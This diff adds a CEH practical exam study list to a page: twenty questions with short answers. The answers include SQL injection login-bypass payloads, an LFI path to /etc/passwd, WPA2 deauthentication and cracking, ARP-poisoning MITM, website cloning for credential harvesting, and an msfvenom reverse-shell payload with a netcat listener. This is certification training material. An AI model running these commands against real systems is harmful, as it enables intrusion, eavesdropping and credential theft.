@@ -576,7 +576,176 @@ now, launch Firefox web browser and go to http://localhost to access Reverse She
 
 
 
+-----
 
+
+Latest CEH Practical Exam Questions and Answers
+1. Analyze Malicious Network Traffic
+Question: You are provided with a .pcap file. Analyze it to identify a potential attack.
+
+Answer:
+
+Open the .pcap file in Wireshark.
+Filter the traffic using protocols like http, ftp, or telnet.
+Look for suspicious activities like brute force attempts or unauthorized downloads.
+Example filter: ftp.request.command == "USER" || ftp.request.command == "PASS"
+2. Identify Open Ports on a Target System
+Question: Scan the IP 192.168.1.10 using Nmap and identify the open ports and services.
+
+Answer:
+
+nmap -sS -sV 192.168.1.10
+    
+Output:
+
+22/tcp open ssh
+80/tcp open http
+3. Exploit a Vulnerable Web Application
+Question: A web application running on 192.168.1.15 has a vulnerable file upload feature. Exploit it to gain access.
+
+Answer:
+
+Upload a reverse shell script (e.g., .php).
+Intercept and modify the request using Burp Suite.
+Set up a listener: nc -lvnp 4444.
+Execute the uploaded file to open a reverse shell.
+4. Perform SQL Injection
+Question: Test for SQL injection on a login page with fields username and password.
+
+Answer:
+
+Enter the following payload in the username field: ' OR '1'='1' --
+Leave the password field blank.
+If successful, you'll bypass authentication.
+5. Capture and Crack a WPA2 Handshake
+Question: Use Aircrack-ng to capture a WPA2 handshake and crack it.
+
+Answer:
+
+Put your wireless adapter in monitor mode: airmon-ng start wlan0
+Capture traffic: airodump-ng wlan0
+Deauthenticate a client: aireplay-ng -0 1 -a [AP_MAC] -c [Client_MAC] wlan0
+Crack the captured handshake with a wordlist: aircrack-ng -w wordlist.txt -b [AP_MAC] capture.cap
+6. Detect Vulnerabilities with Nessus
+Question: Perform a vulnerability scan on a server using Nessus.
+
+Answer:
+
+Launch Nessus and create a new scan for the target IP.
+Start the scan and review the report for critical vulnerabilities.
+Example vulnerability: CVE-2023-XXXX.
+7. Perform Credential Harvesting
+Question: Simulate credential harvesting using Social Engineering Toolkit (SET).
+
+Answer:
+
+Run SET: setoolkit.
+Select "Social Engineering Attacks" and then "Website Attack Vectors."
+Clone a website and collect credentials.
+8. Crack Password Hashes
+Question: Use Hashcat to crack a hashed password.
+
+Answer:
+
+Identify the hash type: hashid [hash].
+Crack it: hashcat -m [hash_mode] -a 0 [hash_file] [wordlist].
+9. Detect ARP Spoofing
+Question: Detect ARP spoofing on your network.
+
+Answer:
+
+Use ARPwatch to monitor ARP requests.
+Look for duplicate IPs with different MAC addresses.
+
+
+10. Enumerate SMB Shares
+Question: List shared folders on a target using SMBClient.
+
+Answer:
+
+smbclient -L \\[IP] -U [username]
+    
+11. Perform Banner Grabbing
+Question: Use Netcat to perform banner grabbing on a target server running on port 80.
+
+Answer:
+
+nc -v [target_IP] 80
+  
+Send a request like: GET / HTTP/1.1 and observe the response to identify the server and version.
+
+12. Conduct DNS Enumeration
+Question: Use Dig to perform DNS enumeration for example.com.
+
+Answer:
+
+dig example.com ANY
+  
+Check for records like A, MX, NS, and TXT.
+
+13. Bypass Login Authentication
+Question: Test a login page for authentication bypass using SQL injection.
+
+Answer:
+
+Payload for username: ' OR 1=1 --
+Leave the password field blank and submit.
+If successful, you will gain access without valid credentials.
+14. Detect Open Vulnerabilities Using OpenVAS
+Question: Run a vulnerability scan using OpenVAS.
+
+Answer:
+
+Launch OpenVAS and configure a new scan.
+Set the target IP and run the scan.
+Review results for exploitable vulnerabilities.
+15. Detect Hidden Directories on a Web Server
+Question: Use Dirbuster to identify hidden directories on a web server.
+
+Answer:
+
+Launch Dirbuster and set the target URL.
+Use a wordlist (e.g., common.txt) for directory brute-forcing.
+Review results for directories like /admin or /backup.
+16. Capture and Analyze HTTP Traffic
+Question: Intercept and analyze HTTP traffic using Burp Suite.
+
+Answer:
+
+Set up Burp Suite as a proxy and configure your browser to route traffic through it.
+Capture the HTTP requests and analyze them for sensitive data (e.g., cookies or credentials).
+17. Crack an Encrypted ZIP File
+Question: Use John the Ripper to crack a password-protected ZIP file.
+
+Answer:
+
+Convert the ZIP hash: zip2john file.zip > hash.txt.
+Crack the password: john --wordlist=wordlist.txt hash.txt.
+18. Detect and Exploit LFI (Local File Inclusion)
+Question: A web application has an LFI vulnerability. Exploit it to read sensitive files.
+
+Answer:
+
+Identify LFI: http://example.com/?file=../../../../etc/passwd.
+Use traversal techniques to access other sensitive files like /var/www/html/config.php.
+19. Perform MITM Attack
+Question: Use Ettercap to perform a man-in-the-middle (MITM) attack on a local network.
+
+Answer:
+
+Enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward.
+Launch Ettercap and select "Sniff > Unified Sniffing."
+Perform ARP poisoning to intercept traffic.
+20. Conduct Reverse Shell Exploitation
+Question: Establish a reverse shell on a vulnerable system.
+
+Answer:
+
+Create a reverse shell payload: msfvenom -p linux/x86/shell_reverse_tcp LHOST=[your_IP] LPORT=4444 -f elf > shell.elf.
+Transfer the payload to the target system.
+Set up a listener: nc -lvnp 4444.
+Execute the payload to gain shell access.
+The CEH Practical Exam is your gateway to becoming a skilled ethical hacker with globally recognized credentials. With the right preparation and our expert guidance, you can ace the exam with confidence.
 
 
 
